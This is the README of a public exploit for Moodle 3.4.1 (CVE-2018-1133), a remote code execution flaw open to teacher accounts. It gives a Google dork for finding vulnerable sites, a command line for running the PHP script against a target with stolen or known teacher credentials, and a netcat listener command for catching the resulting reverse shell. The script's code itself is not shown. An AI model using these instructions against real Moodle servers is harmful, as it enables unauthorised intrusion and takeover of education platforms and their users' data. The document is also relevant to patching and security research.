# Moodle Exploit

* Exploit Title: Moodle v3.4.1 RCE Exploit
* Google Dork: inurl:"/course/jumpto.php?jump="
* Date: 15 March 2019
* Exploit Author: Darryn Ten
* Vendor Homepage: https://moodle.org
* Software Link: https://github.com/moodle/moodle/archive/v3.4.1.zip
* Version: 3.4.1 (Possibly < 3.5.0 and maybe even 3.x)
* Tested on: Linux with Moodle v3.4.1
* CVE : CVE-2018-1133

A user with the teacher role is able to execute arbitrary code.

# Usage

`php MoodleExploit.php url=http://example.com user=teacher pass=password ip=10.10.10.10 port=1010 course=1`

```
user       The account username
pass       The password to the account
ip         Callback IP
port       Callback Port
course     Valid course ID belonging to the teacher
```

Make sure you're running a netcat listener on the specified port before
executing this script.

`nc -lnvp 1010`

This will attempt to open up a reverse shell to the listening IP and port.

# Notes

This exploit is based on information provided by Robin Peraglie.

Additional Reading: https://blog.ripstech.com/2018/moodle-remote-code-execution

